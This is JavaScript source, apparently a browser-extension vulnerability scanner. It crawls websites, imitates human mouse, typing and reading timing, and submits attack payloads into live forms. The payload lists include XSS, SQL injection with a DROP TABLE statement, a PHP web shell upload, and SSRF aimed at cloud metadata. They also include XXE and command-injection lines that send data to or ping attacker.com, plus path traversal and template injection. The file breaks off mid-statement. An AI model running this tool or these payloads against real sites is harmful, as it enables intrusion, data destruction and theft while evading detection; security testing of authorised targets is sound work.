class DOMAnalyzer {
  constructor() {
    this.interactionElements = ['form', 'input', 'button', 'a', 'select', 'textarea', 'checkbox', 'radio'];
    this.payloadGenerator = new PayloadGenerator();
    this.vulnerabilityDetector = new VulnerabilityDetector();
    this.scanDepth = 'medium';
    this.visitedUrls = new Set();
    this.urlsToVisit = [];
    this.currentDomain = window.location.hostname;
    this.lastInteractionTime = Date.now();
    
    // 使用新的人类行为模拟器
    this.humanBehavior = new HumanBehaviorSimulator();
    
    // 保留旧的人类行为模式作为备份
    this.humanBehaviorPatterns = {
      // 人类阅读速度 (每分钟字数)
      readingSpeed: 200 + Math.floor(Math.random() * 100),
      // 注意力持续时间 (毫秒)
      attentionSpan: 15000 + Math.floor(Math.random() * 10000),
      // 鼠标移动速度 (像素/秒)
      mouseSpeed: 800 + Math.floor(Math.random() * 400),
      // 打字速度 (每分钟字符数)
      typingSpeed: 200 + Math.floor(Math.random() * 100),
      // 错误率 (0-1)
      errorRate: 0.05 + Math.random() * 0.05
    };
    
    // 初始化眼球移动模拟
    this.eyePosition = {
      x: window.innerWidth / 2,
      y: window.innerHeight / 2
    };
    
    // 初始化鼠标位置
    this.mousePosition = {
      x: window.innerWidth / 2,
      y: window.innerHeight / 2
    };
  }

  // 智能元素选择算法
  selectInteractiveElements() {
    // 获取所有可交互元素
    const allElements = this.interactionElements.flatMap(tag => 
      Array.from(document.getElementsByTagName(tag))
    );
    
    // 过滤出可见且有意义的元素
    const visibleElements = allElements.filter(el => {
      const rect = el.getBoundingClientRect();
      const style = window.getComputedStyle(el);
      
      return rect.width > 5 && 
             rect.height > 5 && 
             style.visibility !== 'hidden' &&
             style.display !== 'none' &&
             style.opacity !== '0' &&
             rect.top < window.innerHeight && 
             rect.left < window.innerWidth &&
             rect.top >= 0 &&
             rect.left >= 0;
    });
    
    // 按照视觉重要性排序元素
    return this.prioritizeElementsByImportance(visibleElements);
  }
  
  // 根据视觉重要性对元素进行排序
  prioritizeElementsByImportance(elements) {
    // 计算每个元素的重要性分数
    const scoredElements = elements.map(el => {
      let score = 0;
      const rect = el.getBoundingClientRect();
      const tagName = el.tagName.toLowerCase();
      
      // 1. 元素大小 (更大的元素更重要)
      const size = rect.width * rect.height;
      score += Math.min(size / 10000, 10);
      
      // 2. 元素位置 (页面上方和中间的元素更重要)
      const verticalPosition = 1 - (rect.top / window.innerHeight);
      const horizontalCentrality = 1 - (Math.abs(rect.left + rect.width/2 - window.innerWidth/2) / (window.innerWidth/2));
      score += verticalPosition * 5;
      score += horizontalCentrality * 3;
      
      // 3. 元素类型 (表单元素通常更重要)
      if (tagName === 'input' || tagName === 'button' || tagName === 'select') {
        score += 5;
        
        // 提交按钮特别重要
        if ((tagName === 'input' && el.type === 'submit') || 
            (tagName === 'button' && (el.type === 'submit' || el.innerText.match(/submit|提交|确定|保存|登录|注册/i)))) {
          score += 10;
        }
      }
      
      // 4. 颜色对比度 (高对比度的元素更引人注目)
      const style = window.getComputedStyle(el);
      const backgroundColor = style.backgroundColor;
      const color = style.color;
      if (this.hasHighContrast(backgroundColor, color)) {
        score += 3;
      }
      
      // 5. 文本内容 (包含特定关键词的元素更重要)
      const text = el.innerText || el.value || el.placeholder || '';
      if (text.match(/login|登录|sign in|注册|register|submit|提交|search|搜索|buy|购买|download|下载/i)) {
        score += 5;
      }
      
      return { element: el, score };
    });
    
    // 按分数降序排序
    scoredElements.sort((a, b) => b.score - a.score);
    
    // 添加一些随机性，模拟人类不总是选择最优选项
    if (scoredElements.length > 3 && Math.random() < 0.3) {
      // 30%的概率，从前3个元素中随机选择
      const temp = scoredElements[0];
      const randomIndex = Math.floor(Math.random() * 3);
      scoredElements[0] = scoredElements[randomIndex];
      scoredElements[randomIndex] = temp;
    }
    
    return scoredElements.map(item => item.element);
  }
  
  // 检查两种颜色是否有高对比度
  hasHighContrast(color1, color2) {
    // 简化实现，实际应使用WCAG对比度计算
    try {
      const rgb1 = this.parseRGB(color1);
      const rgb2 = this.parseRGB(color2);
      
      if (!rgb1 || !rgb2) return false;
      
      // 计算亮度差异
      const brightness1 = (rgb1.r * 299 + rgb1.g * 587 + rgb1.b * 114) / 1000;
      const brightness2 = (rgb2.r * 299 + rgb2.g * 587 + rgb2.b * 114) / 1000;
      
      return Math.abs(brightness1 - brightness2) > 125;
    } catch (e) {
      return false;
    }
  }
  
  // 解析RGB颜色
  parseRGB(color) {
    if (!color || color === 'transparent' || color === 'rgba(0, 0, 0, 0)') {
      return null;
    }
    
    const match = color.match(/rgba?\((\d+),\s*(\d+),\s*(\d+)(?:,\s*[\d.]+)?\)/);
    if (match) {
      return {
        r: parseInt(match[1]),
        g: parseInt(match[2]),
        b: parseInt(match[3])
      };
    }
    return null;
  }

  // 收集当前页面的所有链接
  collectLinks() {
    // 获取所有链接
    const allLinks = Array.from(document.querySelectorAll('a[href]'))
      .map(a => {
        try {
          // 转换为绝对URL
          return new URL(a.href, window.location.href).href;
        } catch (e) {
          return null;
        }
      })
      .filter(url => url);
    
    // 过滤链接
    const filteredLinks = allLinks.filter(url => {
      try {
        const parsedUrl = new URL(url);
        
        // 过滤条件
        return (
          // 只保留HTTP/HTTPS链接
          (parsedUrl.protocol === 'http:' || parsedUrl.protocol === 'https:') &&
          // 排除已访问的URL
        !this.visitedUrls.has(url) &&
          // 根据扫描深度决定是否限制在同一域名
          (this.scanDepth === 'deep' || parsedUrl.hostname === this.currentDomain) &&
          // 排除危险路径
          !this.isRiskyPath(url) &&
          // 排除常见的非HTML资源
          !url.match(/\.(jpg|jpeg|png|gif|svg|webp|mp4|webm|mp3|pdf|zip|rar|exe|dll|doc|docx|xls|xlsx|ppt|pptx)$/i) &&
          // 排除锚点链接（指向同一页面的不同部分）
          !(parsedUrl.hostname === window.location.hostname && 
            parsedUrl.pathname === window.location.pathname && 
            parsedUrl.hash !== '')
        );
      } catch (e) {
        return false;
      }
    });
    
    // 对链接进行优先级排序
    return this.prioritizeLinks(filteredLinks);
  }
  
  // 对链接进行优先级排序
  prioritizeLinks(links) {
    // 计算每个链接的优先级分数
    const scoredLinks = links.map(url => {
      let score = 0;
      try {
        const parsedUrl = new URL(url);
        
        // 1. 同域名链接优先
        if (parsedUrl.hostname === this.currentDomain) {
          score += 10;
        }
        
        // 2. 路径深度 (较浅的路径优先)
        const pathDepth = parsedUrl.pathname.split('/').filter(p => p).length;
        score += Math.max(0, 5 - pathDepth);
        
        // 3. 特定关键词加分
        const lowerUrl = url.toLowerCase();
        if (lowerUrl.includes('login') || lowerUrl.includes('signin') || 
            lowerUrl.includes('register') || lowerUrl.includes('signup') ||
            lowerUrl.includes('admin') || lowerUrl.includes('user') ||
            lowerUrl.includes('account') || lowerUrl.includes('profile') ||
            lowerUrl.includes('dashboard')) {
          score += 5;
        }
        
        // 4. 参数数量 (有参数的URL可能更有趣)
        const paramsCount = parsedUrl.searchParams.toString().length > 0 ? 
                           Array.from(parsedUrl.searchParams.keys()).length : 0;
        score += Math.min(paramsCount, 3);
        
        // 5. 避免明显的注销链接
        if (lowerUrl.includes('logout') || lowerUrl.includes('signout') || 
            lowerUrl.includes('exit') || lowerUrl.includes('quit')) {
          score -= 20;
        }
        
        return { url, score };
      } catch (e) {
        return { url, score: 0 };
      }
    });
    
    // 按分数降序排序
    scoredLinks.sort((a, b) => b.score - a.score);
    
    // 添加一些随机性
    if (scoredLinks.length > 5) {
      // 随机打乱前5个链接的顺序
      for (let i = 0; i < 5; i++) {
        const j = i + Math.floor(Math.random() * (Math.min(5, scoredLinks.length) - i));
        if (j < scoredLinks.length) {
          [scoredLinks[i], scoredLinks[j]] = [scoredLinks[j], scoredLinks[i]];
        }
      }
    }
    
    return scoredLinks.map(item => item.url);
  }

  // 检查URL是否可能是危险路径
  isRiskyPath(url) {
    try {
      const parsedUrl = new URL(url);
      const path = parsedUrl.pathname.toLowerCase();
      
    const riskyPatterns = [
        '/admin', '/delete', '/remove', '/logout', '/signout',
        '/wp-admin', '/administrator', '/user/logout', 
        '/account/delete', '/profile/delete', '/settings/delete',
        'logout.php', 'delete.php', 'remove.php', 'destroy.php',
        '/api/delete', '/api/remove', '/api/destroy',
        '/delete-account', '/remove-account', '/cancel-account'
      ];
      
      // 检查路径是否包含危险模式
      for (const pattern of riskyPatterns) {
        if (path.includes(pattern)) {
          return true;
        }
      }
      
      // 检查查询参数是否包含危险操作
      const queryString = parsedUrl.search.toLowerCase();
      const riskyParams = [
        'delete=', 'remove=', 'destroy=', 'action=delete',
        'action=remove', 'action=logout', 'action=signout',
        'mode=delete', 'operation=delete'
      ];
      
      for (const param of riskyParams) {
        if (queryString.includes(param)) {
          return true;
        }
      }
      
      return false;
    } catch (e) {
      // URL解析错误，为安全起见返回true
      return true;
    }
  }

  // 更新humanClick方法，使用新的人类行为模拟器
  async humanClick(element) {
    if (!element) return;
    
    try {
      // 获取元素位置
    const rect = element.getBoundingClientRect();
      const centerX = rect.left + rect.width / 2;
      const centerY = rect.top + rect.height / 2;
      
      // 检查元素是否在视口内
      if (centerX < 0 || centerY < 0 || 
          centerX > window.innerWidth || centerY > window.innerHeight) {
        // 元素不在视口内，需要先滚动到元素位置
        await this.scrollToElement(element);
      }
      
      // 使用新的人类行为模拟器模拟视觉注意力移动
      await this.humanBehavior.simulateVisualAttention(centerX, centerY);
      
      // 模拟注意力分散
      const distractionTime = this.humanBehavior.simulateDistraction();
      if (distractionTime > 0) {
        await new Promise(resolve => setTimeout(resolve, distractionTime));
      }
      
      // 使用新的人类行为模拟器模拟点击
      const clickTime = await this.humanBehavior.simulateHumanClick(centerX, centerY);
      
      // 更新鼠标位置
      this.mousePosition = { x: centerX, y: centerY };
      
      // 实际点击元素
      element.click();
      
      // 更新最后交互时间
      this.lastInteractionTime = Date.now();
      
      // 发送点击事件到background
      chrome.runtime.sendMessage({
        action: 'recordInteraction',
        data: {
          type: 'click',
          element: element.tagName,
          position: { x: centerX, y: centerY },
          time: Date.now()
        }
      });
      
      // 返回总操作时间
      return clickTime;
    } catch (error) {
      console.error('模拟人类点击时出错:', error);
      // 降级到简单点击
      element.click();
      return 0;
    }
  }
  
  // 更新humanTypeText方法，使用新的人类行为模拟器
  async humanTypeText(inputElement, text) {
    if (!inputElement || !text) return;
    
    try {
      // 先点击输入框
      await this.humanClick(inputElement);
      
      // 使用新的人类行为模拟器模拟输入
      const typingTime = await this.humanBehavior.simulateHumanTyping(text);
      
      // 实际设置输入值
      inputElement.value = text;
      
      // 触发input和change事件
      inputElement.dispatchEvent(new Event('input', { bubbles: true }));
      inputElement.dispatchEvent(new Event('change', { bubbles: true }));
    
    // 更新最后交互时间
    this.lastInteractionTime = Date.now();
    
      // 发送输入事件到background
      chrome.runtime.sendMessage({
        action: 'recordInteraction',
        data: {
          type: 'input',
          element: inputElement.tagName,
          inputType: inputElement.type || 'text',
          time: Date.now()
        }
      });
      
      // 返回总操作时间
      return typingTime;
    } catch (error) {
      console.error('模拟人类输入时出错:', error);
      // 降级到简单输入
      inputElement.value = text;
      inputElement.dispatchEvent(new Event('input', { bubbles: true }));
      inputElement.dispatchEvent(new Event('change', { bubbles: true }));
      return 0;
    }
  }
  
  // 更新simulateHumanScrolling方法，使用新的人类行为模拟器
  async simulateHumanScrolling() {
    try {
      // 计算页面高度和视口高度
      const pageHeight = Math.max(
        document.body.scrollHeight,
        document.body.offsetHeight,
        document.documentElement.clientHeight,
        document.documentElement.scrollHeight,
        document.documentElement.offsetHeight
      );
      
      const viewportHeight = window.innerHeight;
      const maxScrollY = pageHeight - viewportHeight;
      
      if (maxScrollY <= 0) {
        // 页面不需要滚动
        return;
      }
      
      // 当前滚动位置
      let currentScrollY = window.scrollY;
      
      // 计算滚动距离 (根据页面内容和当前位置动态决定)
      const remainingScroll = maxScrollY - currentScrollY;
      
      if (remainingScroll <= 0) {
        // 已经滚动到底部
        return;
      }
      
      // 计算本次滚动距离 (视口高度的一部分)
      const scrollDistance = Math.min(
        remainingScroll,
        viewportHeight * (0.3 + Math.random() * 0.4)
      );
      
      // 使用新的人类行为模拟器模拟滚动
      const scrollResult = await this.humanBehavior.simulateHumanScrolling(scrollDistance);
      
      // 执行滚动
      const scrollStep = async (timestamp) => {
        // 找到当前时间应该执行的滚动步骤
        const currentSteps = scrollResult.scrollSteps.filter(
          step => step.time <= Date.now()
        );
        
        if (currentSteps.length > 0) {
          // 获取最新的滚动步骤
          const latestStep = currentSteps[currentSteps.length - 1];
          
          // 执行滚动
          window.scrollTo({
            top: currentScrollY + latestStep.distance,
            behavior: 'auto' // 使用'auto'而不是'smooth'，因为我们自己控制平滑度
          });
          
          // 从步骤列表中移除已执行的步骤
          scrollResult.scrollSteps = scrollResult.scrollSteps.filter(
            step => step.time > Date.now()
          );
        }
        
        // 如果还有未执行的步骤，继续请求动画帧
        if (scrollResult.scrollSteps.length > 0) {
          requestAnimationFrame(scrollStep);
        }
      };
      
      // 开始滚动动画
      requestAnimationFrame(scrollStep);
      
      // 等待滚动完成
      await new Promise(resolve => setTimeout(resolve, scrollResult.totalTime));
      
      // 更新最后交互时间
      this.lastInteractionTime = Date.now();
      
      // 发送滚动事件到background
      chrome.runtime.sendMessage({
        action: 'recordInteraction',
        data: {
          type: 'scroll',
          distance: scrollDistance,
          time: Date.now()
        }
      });
      
      // 模拟阅读内容
      await this.simulateReading();
      
      return scrollResult.totalTime;
    } catch (error) {
      console.error('模拟人类滚动时出错:', error);
      // 降级到简单滚动
      window.scrollBy(0, window.innerHeight * 0.5);
      return 0;
    }
  }
  
  // 新增方法：模拟阅读内容
  async simulateReading() {
    try {
      // 获取当前视口中的文本内容
      const textElements = Array.from(document.querySelectorAll('p, h1, h2, h3, h4, h5, h6, li, td, th, span, div'))
        .filter(el => {
          // 过滤出在视口中的元素
          const rect = el.getBoundingClientRect();
          return rect.top >= 0 && 
                 rect.bottom <= window.innerHeight &&
                 rect.width > 0 &&
                 rect.height > 0 &&
                 el.textContent.trim().length > 0;
        });
      
      if (textElements.length === 0) {
        return 0;
      }
      
      // 随机选择1-3个文本元素进行"阅读"
      const elementsToRead = Math.min(1 + Math.floor(Math.random() * 3), textElements.length);
      let totalReadingTime = 0;
      
      for (let i = 0; i < elementsToRead; i++) {
        // 随机选择一个文本元素
        const randomIndex = Math.floor(Math.random() * textElements.length);
        const element = textElements[randomIndex];
        
        // 从数组中移除已选择的元素
        textElements.splice(randomIndex, 1);
        
        // 获取元素位置
        const rect = element.getBoundingClientRect();
        const centerX = rect.left + rect.width / 2;
        const centerY = rect.top + rect.height / 2;
        
        // 模拟视觉注意力移动到文本
        await this.humanBehavior.simulateVisualAttention(centerX, centerY);
        
        // 计算阅读时间 (基于文本长度和阅读速度)
        const textLength = element.textContent.trim().length;
        const readingSpeed = this.humanBehavior.traits.reading.speed; // 每分钟字数
        const baseReadingTime = (textLength / readingSpeed) * 60 * 1000; // 毫秒
        
        // 应用理解水平和扫描概率调整阅读时间
        const comprehensionFactor = this.humanBehavior.traits.reading.comprehensionLevel;
        const scanningFactor = Math.random() < this.humanBehavior.traits.reading.scanningProbability ? 0.3 : 1.0;
        
        const adjustedReadingTime = baseReadingTime * comprehensionFactor * scanningFactor;
        
        // 等待阅读时间
        await new Promise(resolve => setTimeout(resolve, adjustedReadingTime));
        
        totalReadingTime += adjustedReadingTime;
        
        // 模拟注意力分散
        const distractionTime = this.humanBehavior.simulateDistraction();
        if (distractionTime > 0) {
          await new Promise(resolve => setTimeout(resolve, distractionTime));
          totalReadingTime += distractionTime;
        }
      }
      
      return totalReadingTime;
    } catch (error) {
      console.error('模拟阅读时出错:', error);
      return 0;
    }
  }
  
  // 新增方法：滚动到元素位置
  async scrollToElement(element) {
    if (!element) return 0;
    
    try {
      // 获取元素位置
      const rect = element.getBoundingClientRect();
      
      // 计算目标滚动位置 (使元素在视口中间)
      const targetScrollY = window.scrollY + rect.top - (window.innerHeight / 2) + (rect.height / 2);
      
      // 计算滚动距离
      const scrollDistance = targetScrollY - window.scrollY;
      
      // 使用人类行为模拟器模拟滚动
      const scrollResult = await this.humanBehavior.simulateHumanScrolling(scrollDistance);
      
      // 执行滚动
      const scrollStep = async (timestamp) => {
        // 找到当前时间应该执行的滚动步骤
        const currentSteps = scrollResult.scrollSteps.filter(
          step => step.time <= Date.now()
        );
        
        if (currentSteps.length > 0) {
          // 获取最新的滚动步骤
          const latestStep = currentSteps[currentSteps.length - 1];
          
          // 执行滚动
          window.scrollTo({
            top: window.scrollY + latestStep.distance - (scrollResult.scrollSteps[0]?.distance || 0),
            behavior: 'auto'
          });
          
          // 从步骤列表中移除已执行的步骤
          scrollResult.scrollSteps = scrollResult.scrollSteps.filter(
            step => step.time > Date.now()
          );
        }
        
        // 如果还有未执行的步骤，继续请求动画帧
        if (scrollResult.scrollSteps.length > 0) {
          requestAnimationFrame(scrollStep);
        }
      };
      
      // 开始滚动动画
      requestAnimationFrame(scrollStep);
      
      // 等待滚动完成
      await new Promise(resolve => setTimeout(resolve, scrollResult.totalTime));
    
    // 更新最后交互时间
    this.lastInteractionTime = Date.now();
      
      return scrollResult.totalTime;
    } catch (error) {
      console.error('滚动到元素位置时出错:', error);
      // 降级到简单滚动
      element.scrollIntoView({ behavior: 'smooth', block: 'center' });
      await new Promise(resolve => setTimeout(resolve, 500));
      return 500;
    }
  }
  
  // 开始深度测试
  async startDeepScan() {
    // 记录当前URL为已访问
    this.visitedUrls.add(window.location.href);
    
    // 模拟人浏览页面的行为
    await this.simulatePageViewing();
    
    // 测试当前页面的交互元素
    await this.testInteractiveElements();
    
    // 收集当前页面上的链接
    if (this.scanDepth !== 'light') {
      const links = this.collectLinks();
      
      // 将新链接添加到待访问队列
      for (const link of links) {
        if (!this.urlsToVisit.includes(link)) {
          this.urlsToVisit.push(link);
        }
      }
      
      // 如果是中度扫描，最多访问5个链接
      if (this.scanDepth === 'medium' && this.urlsToVisit.length > 5) {
        this.urlsToVisit = this.urlsToVisit.slice(0, 5);
      }
      
      // 访问队列中的下一个URL
      if (this.urlsToVisit.length > 0) {
        const nextUrl = this.urlsToVisit.shift();
        
        // 延迟一段时间，模拟人的思考过程
        await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 1000));
        
        // 导航到下一个URL
        window.location.href = nextUrl;
      }
    }
  }
  
  // 模拟人浏览页面的行为
  async simulatePageViewing() {
    // 模拟视线浏览页面
    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 1000));
    
    // 模拟滚动行为
    await this.simulateHumanScrolling();
    
    // 在完成滚动后，再等待一些时间
    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 1000));
  }
  
  // 优化的重要元素查找方法
  async findImportantElementsOptimized() {
    // 使用更高效的选择器
    const headings = Array.from(document.querySelectorAll('h1, h2, h3'));
    const images = Array.from(document.querySelectorAll('img[width][height]')).filter(img => {
      const width = parseInt(img.getAttribute('width') || img.width);
      const height = parseInt(img.getAttribute('height') || img.height);
      return width > 100 && height > 100; // 只选择较大的图片
    });
    
    const buttons = Array.from(document.querySelectorAll('button, .btn, [role="button"]'));
    const forms = Array.from(document.querySelectorAll('form'));
    const videos = Array.from(document.querySelectorAll('video, iframe[src*="youtube"], iframe[src*="vimeo"]'));
    
    // 使用Set去重
    const importantElements = [...new Set([...headings, ...images, ...buttons, ...forms, ...videos])];
    
    // 限制元素数量，避免性能问题
    return importantElements.slice(0, 20);
  }
  
  // 查找最接近当前滚动位置的元素
  findNearestElement(elements, scrollPosition) {
    let nearestElement = null;
    let minDistance = Infinity;
    
    elements.forEach(el => {
      const rect = el.getBoundingClientRect();
      const elementPosition = scrollPosition + rect.top;
      const distance = Math.abs(scrollPosition - elementPosition);
      
      if (distance < minDistance) {
        minDistance = distance;
        nearestElement = el;
      }
    });
    
    return nearestElement;
  }
  
  // 测试页面上的交互元素
  async testInteractiveElements() {
    const elements = this.selectInteractiveElements();
    
    // 随机打乱元素顺序，避免固定模式
    const shuffledElements = this.shuffleArray(elements);
    
    // 测试每个元素
    for (let i = 0; i < Math.min(shuffledElements.length, 10); i++) {
      const element = shuffledElements[i];
      
      // 根据元素类型决定测试方法
      if (element.tagName === 'FORM') {
        await this.testForm(element);
      } else if (element.tagName === 'INPUT') {
        await this.testInput(element);
      } else if (element.tagName === 'BUTTON') {
        // 对于删除、退出等危险按钮，避免点击
        if (!this.isDangerousButton(element)) {
          await this.humanClick(element);
        }
      } else if (element.tagName === 'A') {
        // 对于指向同域的链接，可以点击
        const href = element.getAttribute('href');
        if (href && !href.startsWith('javascript:') && !this.isRiskyPath(href)) {
          await this.humanClick(element);
          
          // 给页面加载的时间
          await new Promise(resolve => setTimeout(resolve, 2000));
          
          // 有时候返回上一页
          if (Math.random() > 0.5) {
            window.history.back();
            await new Promise(resolve => setTimeout(resolve, 1500));
          }
        }
      }
      
      // 每个操作之间添加随机延迟
      await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 1200));
    }
  }
  
  // 测试表单
  async testForm(form) {
    // 查找表单中的输入字段
    const inputs = form.querySelectorAll('input[type="text"], input[type="password"], input[type="email"], textarea');
    
    // 对每个输入字段进行测试
    for (const input of inputs) {
      const payload = this.payloadGenerator.generatePayload(input);
      await this.humanTypeText(input, payload);
    }
    
    // 记录表单状态，以便检测漏洞
    const initialFormState = this.vulnerabilityDetector.captureState();
    
    // 查找提交按钮
    const submitButton = form.querySelector('input[type="submit"], button[type="submit"], button');
    if (submitButton) {
      // 50%的概率提交表单
      if (Math.random() > 0.5) {
        await this.humanClick(submitButton);
        
        // 等待响应
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // 检测响应中的漏洞
        this.vulnerabilityDetector.detectVulnerabilities(initialFormState);
      }
    }
  }
  
  // 测试输入框
  async testInput(input) {
    if (input.type === 'text' || input.type === 'password' || input.type === 'email' || input.type === 'search') {
      const payload = this.payloadGenerator.generatePayload(input);
      await this.humanTypeText(input, payload);
      
      // 有时候按下Enter键
      if (Math.random() > 0.7) {
        input.dispatchEvent(new KeyboardEvent('keydown', {
          bubbles: true,
          cancelable: true,
          key: 'Enter',
          keyCode: 13
        }));
        
        await new Promise(resolve => setTimeout(resolve, 1500));
      }
    }
  }
  
  // 判断按钮是否可能是危险操作
  isDangerousButton(button) {
    const buttonText = button.textContent.toLowerCase();
    const dangerousTerms = ['delete', 'remove', 'logout', '删除', '退出', '注销'];
    
    return dangerousTerms.some(term => buttonText.includes(term));
  }
  
  // 随机打乱数组
  shuffleArray(array) {
    const result = [...array];
    for (let i = result.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [result[i], result[j]] = [result[j], result[i]];
    }
    return result;
  }
}

class PayloadGenerator {
  constructor() {
    this.xssPayloads = [
      '<script>alert("XSS Detected")</script>',
      '"><script>alert("XSS Detected")</script>',
      '"><img src=x onerror="alert(\'XSS Detected\')">',
      '\' onmouseover=\'alert("XSS Detected")\'',
      '";alert("XSS Detected");//',
      '<div data-xss-test="1">XSS Test</div>',
      '"><svg/onload=alert("XSS Detected")>',
      '\'><iframe/srcdoc="<script>alert(\'XSS Detected\')</script>">',
      'javascript:alert("XSS Detected")'
    ];
    
    this.sqlInjectionPayloads = [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "admin' --",
      "1' OR '1' = '1",
      "' UNION SELECT 1,2,3 --",
      "'; DROP TABLE users; --",
      "1'; SELECT * FROM information_schema.tables; --",
      "' OR 1=1 #",
      "') OR ('1'='1",
      "' OR 1=1 LIMIT 1; --"
    ];
    
    this.normalInputs = [
      "测试",
      "test123",
      "用户名",
      "password",
      "13800138000",
      "example@example.com",
      "北京市海淀区",
      "https://example.com",
      "2023-01-01",
      "100.00"
    ];
    
    this.fileUploadPayloads = [
      { name: "test.php", content: "<?php echo 'XSS Detected'; ?>" },
      { name: "test.html", content: "<script>alert('XSS Detected')</script>" },
      { name: "test.svg", content: "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS Detected')\">" },
      { name: "test.jpg.php", content: "<?php system($_GET['cmd']); ?>" },
      { name: "test.js", content: "alert('XSS Detected');" }
    ];
    
    this.csrfTestPayloads = [
      "<form id='csrf-test-form' action='TARGET_URL' method='post'><input type='hidden' name='test' value='csrf-test'></form><script>document.getElementById('csrf-test-form').submit();</script>"
    ];
    
    // 添加SSRF测试载荷
    this.ssrfPayloads = [
      'http://127.0.0.1/',
      'http://localhost/',
      'http://[::1]/',
      'http://127.0.0.1:22/',
      'http://127.0.0.1:3306/',
      'http://127.0.0.1:6379/',
      'http://127.0.0.1:5432/',
      'http://127.0.0.1:8080/',
      'http://169.254.169.254/latest/meta-data/',  // AWS元数据
      'http://metadata.google.internal/',          // GCP元数据
      'file:///etc/passwd',
      'file:///C:/Windows/win.ini',
      'dict://localhost:11211/',                   // Memcached
      'gopher://localhost:25/'                     // SMTP
    ];
    
    // 添加XXE测试载荷
    this.xxePayloads = [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///C:/Windows/win.ini">]><data>&file;</data>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % param1 "file:///etc/passwd"><!ENTITY % param2 "http://attacker.com/?%param1;">]><data>%param2;</data>'
    ];
    
    // 添加CORS测试载荷
    this.corsPayloads = [
      'https://evil.com',
      'null',
      'https://subdomain.target.com',
      'https://target.com.attacker.com'
    ];
    
    // 添加JWT测试载荷
    this.jwtPayloads = [
      // none算法
      'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
      // 弱密钥
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
    ];
    
    // 添加开放重定向测试载荷
    this.openRedirectPayloads = [
      'https://evil.com',
      'https://attacker.com',
      '//evil.com',
      'javascript:alert(document.domain)',
      'data:text/html,<script>alert(document.domain)</script>',
      '\\/\\/evil.com',
      '%2F%2Fevil.com'
    ];
    
    // 添加HTTP参数污染测试载荷
    this.hppPayloads = [
      'normal',
      'normal&param=injection',
      'normal%26param=injection',
      'normal%2526param=injection'
    ];
    
    // 添加服务器端模板注入测试载荷
    this.sstiPayloads = [
      '${7*7}',
      '{{7*7}}',
      '<%= 7*7 %>',
      '#{7*7}',
      '${{7*7}}',
      '#{7*7}',
      '${T(java.lang.Runtime).getRuntime().exec("whoami")}',
      '{{config.__class__.__init__.__globals__["os"].popen("whoami").read()}}',
      '<%= system("whoami") %>',
      '{{self.__init__.__globals__.__builtins__.__import__("os").popen("whoami").read()}}'
    ];
    
    // 添加命令注入测试载荷
    this.commandInjectionPayloads = [
      '; whoami',
      '| whoami',
      '|| whoami',
      '& whoami',
      '&& whoami',
      '`whoami`',
      '$(whoami)',
      '; ping -c 1 attacker.com',
      '| ping -c 1 attacker.com',
      '& ping -c 1 attacker.com',
      '; ping -n 1 attacker.com',
      '| ping -n 1 attacker.com',
      '& ping -n 1 attacker.com'
    ];
    
    // 添加路径遍历测试载荷
    this.pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\Windows\\win.ini',
      '....//....//....//etc/passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd'
    ];
    
    // 添加不安全反序列化测试载荷
    this.deserializationPayloads = [
      'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
      'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAAEdGVzdHg=',
      '{"test": "__proto__", "constructor": {"prototype": {"test2": "polluted"}}}'
    ];
  }
  
  // 根据元素类型生成合适的payload
  generatePayload(element) {
    const tagName = element.tagName.toLowerCase();
    const type = (element.type || '').toLowerCase();
      const name = (element.name || '').toLowerCase();
      const id = (element.id || '').toLowerCase();
    const placeholder = (element.placeholder || '').toLowerCase();
    
    // 根据元素类型选择不同的payload策略
    if (tagName === 'input') {
      // 文件上传输入
      if (type === 'file') {
        return this.generateFilePayload();
      }
      
      // 密码输入
      if (type === 'password') {
        return this.generatePasswordPayload();
      }
      
      // 邮箱输入
      if (type === 'email' || name.includes('email') || placeholder.includes('email') || id.includes('email')) {
        return this.generateEmailPayload();
      }
      
      // 用户名输入
      if (name.includes('user') || id.includes('user') || placeholder.includes('user') || 
          name.includes('name') || id.includes('name') || placeholder.includes('name')) {
        return this.generateUsernamePayload();
      }
      
      // 搜索输入
      if (type === 'search' || name.includes('search') || id.includes('search') || placeholder.includes('search')) {
        return this.generateSearchPayload();
      }
      
      // URL输入
      if (type === 'url' || name.includes('url') || id.includes('url') || placeholder.includes('url')) {
        return this.generateUrlPayload();
      }
      
      // 电话号码输入
      if (type === 'tel' || name.includes('phone') || id.includes('phone') || 
          name.includes('mobile') || id.includes('mobile') || 
          placeholder.includes('phone') || placeholder.includes('手机')) {
        return this.generatePhonePayload();
      }
      
      // 数字输入
      if (type === 'number') {
        return this.generateNumberPayload();
      }
      
      // 日期输入
      if (type === 'date') {
        return this.generateDatePayload();
      }
      
      // 默认情况：随机选择XSS或SQL注入payload
      return Math.random() > 0.5 ? 
